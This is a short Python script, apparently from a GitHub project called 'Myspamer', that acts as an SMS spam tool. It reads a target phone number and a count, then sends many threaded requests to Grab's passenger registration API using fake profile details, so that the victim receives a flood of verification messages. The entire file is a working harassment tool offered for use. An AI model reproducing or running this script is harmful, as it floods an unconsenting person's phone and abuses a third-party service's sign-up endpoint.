#!/usr/bin/python
# Coded by Senja
# Github: github.com/theaixtynine/Myspamer

from multiprocessing.pool import ThreadPool
try:
        import os, random
        from time import sleep as turu
        import subprocess as sp
        import requests
except ModuleNotFoundError:
        print("\n\033[0m[\033[1;31m!\033[0m] \033[1;77mModule requests not installed\n")
        exit(1)

try:
        no = input("\033[0m[\033[1;32m+\033[0m] \033[1;77mInput No Target: \033[0m")
        jum=int(input("\033[0m[\033[1;35m?\033[0m] \033[1;77mCount: \033[0m"))
except KeyboardInterrupt:
        print("\n\033[0m[\033[1;31m!\033[0m] \033[1;77mKey interrupt\n")
        exit(1)
print
print("\033[0m[\033[1;33m*\033[0m] \033[1;77mResult")
def main(arg):
        try:
                idk=('phoneNumber')
                r = requests.post('https://p.grabtaxi.com/api/passenger/v2/profiles/register', data={'phoneNumber':no, 'countryCode': 'ID', 'name': 'nuubi', 'email': 'nuubi@mail.com', 'deviceToken': '*'}, headers={'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/66.0.3359.117 Safari/537.36'})
                #print(r.text)
                if str(idk) in str(r.text):
                        print("\033[0m[\033[1;36m&\033[0m] \033[1;77mSucces")
                else:
                        print("\033[0m[\033[1;31m!\033[0m] \033[1;77mFailed")
        except: pass

jobs = []
for x in range(jum):
    jobs.append(x)
p=ThreadPool(5)
p.map(main,jobs)
print("\033[0m[\033[1;34m#\033[0m] \033[1;77mDone\n")
